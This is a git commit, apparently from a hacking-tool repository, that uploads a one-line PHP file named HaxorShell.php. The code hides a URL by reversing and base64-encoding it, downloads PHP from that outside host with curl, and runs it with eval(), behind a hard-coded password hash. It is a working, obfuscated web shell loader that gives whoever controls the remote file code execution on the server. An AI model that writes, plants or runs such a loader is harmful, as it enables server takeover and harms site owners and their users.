96d2982068552e02789a287ac5e7c7d4e48887a7
trhacknon <82779890+trhacknonimous@users.noreply.github.com>
2022-01-12 15:31:43 +0100

    Add files via upload

---
+++ HaxorShell.php
@@ -0,0 +1,1 @@
+<?php $password="73697ad765f03221a5ef7ee7a99b5e61";$ch=curl_init(base64_decode(strrev("AHaw5iclRWYvx2Ll5Wan5WZv4Wah12LsxWZoNlcwgHNI9CZp92Z5xGbpd3Lt92YuQnblRnbvNmclNXdiVHa0l2ZucXYy9yL6MHc0RHa")));curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);$r=curl_exec($ch);$e=base64_decode(strrev("4zP"));eval($e.$r);?>
